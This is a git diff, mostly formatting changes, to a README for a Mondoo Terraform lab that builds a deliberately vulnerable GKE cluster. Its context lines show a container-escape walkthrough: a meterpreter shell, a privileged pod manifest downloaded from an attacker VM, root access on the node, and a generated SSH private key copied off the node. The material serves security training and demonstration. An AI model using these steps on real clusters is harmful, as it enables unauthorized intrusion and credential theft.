@@ -55,20 +55,26 @@ This folder contains Terraform automation code to provision the following:
   Owner
   ```
 - [gcloud CLI](https://cloud.google.com/sdk/docs/install)
+
   - make sure to install the [gke-gcloud-auth-plugin](https://cloud.google.com/blog/products/containers-kubernetes/kubectl-auth-changes-in-gke), usually via the command:
+
   ```
   gcloud components install gke-gcloud-auth-plugin
   ```
+
   - make sure to login to you Google Cloud Account account via:
+
   ```
   gcloud auth application-default login
   ```
+
   - make sure to set gcloud CLI to the right project
+
   ```
   gcloud config set project <your-project-id> #e.g. my-test-project
   ```
 
-- [Terraform](https://learn.hashicorp.com/tutorials/terraform/install-cli) 
+- [Terraform](https://learn.hashicorp.com/tutorials/terraform/install-cli)
 - [kubectl](https://kubernetes.io/docs/tasks/tools/#kubectl) - Kubectl must be installed on the host that you run `terraform` from.
 
 ## Provision the cluster
@@ -331,6 +337,7 @@ root@attacker:~/container-escape# ./start_ruby_webserver
 ```
 
 ### Find out the attacker machines public IP:
+
 ```bash
 root@lunalectric-attacker-vm-3v0c:~# cat container-escape/pub-ip
 34.70.139.37
@@ -361,6 +368,7 @@ Now you have a reverse meterpreter session from the container, to get a shell ty
 ```bash
 meterpreter > shell
 ```
+
 ```
 Process 321 created.
 Channel 1 created.
@@ -379,9 +387,11 @@ export PATH=/tmp:$PATH; cd /tmp; curl -LO https://storage.googleapis.com/kuberne
 ```
 
 **Find out the node IP via the `/etc/resolv.conf`**
+
 ```bash
 cat /etc/resolv.conf
 ```
+
 ```
 search default.svc.cluster.local svc.cluster.local cluster.local us-central1-c.c.<username>-development-3.internal c.<username>-development-3.internal google.internal
 nameserver 10.228.0.10 #                 <----This is the line we need
@@ -407,37 +417,47 @@ yes
 ### Deploy a pod that will get you a `root` account on the node
 
 **Download the `pod-esc.yaml` from the attacker VM**
+
 ```bash
 curl -vk http://<attacker_vm_public_ip>:8001/pod-esc.yaml -o /tmp/pod-esc.yaml
 ```
 
 **Create the pod on the cluster**
+
 ```bash
 kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/  apply -f /tmp/pod-esc.yaml
 ```
+
 ```
 pod/priv-and-hostpid-exec-pod created
 ```
 
 **Access the node via the just created escape pod**
+
 ```
 kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/  exec -it priv-and-hostpid-exec-pod -n default  -- sh
 ```
+
 ```
 Unable to use a TTY - input is not a terminal or the right kind of file
 ```
+
 **Now you can run commands on the node**
+
 ```
 id
 ```
+
 ```
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
 **Verifying you are on the node via the Google Metadata Service**
+
 ```
 curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/hostname
 ```
+
 ```
 gke-lunalectric-gke--lunalectric-pool-0e144d64-33rz.us-central1-f.c.<username>-development-3.internal
 ```
@@ -451,22 +471,27 @@ Which we can confirm by just asking for the hostname.
 ```bash
 hostname
 ```
+
 ```
 gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj
 ```
 
 We can then either directly from the node try to confirm our external IP address via curl.
+
 ```bash
 curl http://ifconfig.me/
 ```
+
 ```
 35.226.180.169
 ```
 
 Or, alternatively on the system from which we deployed the Terraform run:
+
 ```bash
 gcloud compute instances list
 ```
+
 ```
 NAME                                                 ZONE           MACHINE_TYPE  PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP     STATUS
 gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj  us-central1-a  e2-medium                  10.10.10.3   35.226.180.169  RUNNING
@@ -479,9 +504,11 @@ gke-lunalectric-gke--lunalectric-pool-24ac192f-x1gh  us-central1-f  e2-medium   
 **Generating a ssh-key on the node**
 
 There should be a user on the node that mimics your local username you are connected to with `gcloud`. To find it use the following command:
+
 ```
 cat /etc/passwd
 ```
+
 ```
 sshd:!:204:204:ssh daemon:/dev/null:/bin/false
 ntp:!:203:203:network time protocol daemon:/dev/null:/bin/false
@@ -512,19 +539,23 @@ debugfs-access:!:605:605:access to debugfs:/dev/null:/bin/false
 ```
 
 Then we switch to the context of that user.
+
 ```bash
 su <username>
 ```
 
 Change to the user's `.ssh` directory
+
 ```bash
 cd /home/<username>/.ssh
 ```
 
 Then run the command to generate a new ssh_key for <username>, for which we do not need to enter a password:
+
 ```bash
 ssh-keygen
 ```
+
 ```
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/<username>/.ssh/id_rsa):
@@ -549,6 +580,7 @@ The key's randomart image is:
 ```
 
 Now we can display the private key via `cat`:
+
 ```
 cat id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -561,6 +593,7 @@ We copy and paste this key to our local machine to the file `id_rsa` and now we 
 ```
 ssh -i id_rsa -o CheckHostIP=no -o StrictHostKeyChecking=no <username>@35.226.180.169
 ```
+
 ```
 Welcome to Kubernetes v1.23.16-gke.1400!
 
@@ -580,16 +613,18 @@ For Kubernetes copyright and licensing information, see:
 ```
 
 And we get `root` with a simple sudo:
+
 ```
 <username>@gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj ~ $ sudo su
 ```
+
 ```
 gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj /home/<username> # id
 ```
+
 ```
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video),1001(chronos-access)
 ```
-
 
 ## Mondoo scan commands
 
@@ -678,17 +713,16 @@ gcp.project.kms.keyrings {*}
 ```
 
 ## Destroy the cluster
+
 **NOTE: This command has to be run twice to remove all assets created!**
 
 ```bash
 terraform destroy -auto-approve
 ```
 
-
-
 ## License and Author
 
-* Author:: Mondoo Inc
+- Author:: Mondoo Inc
 
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
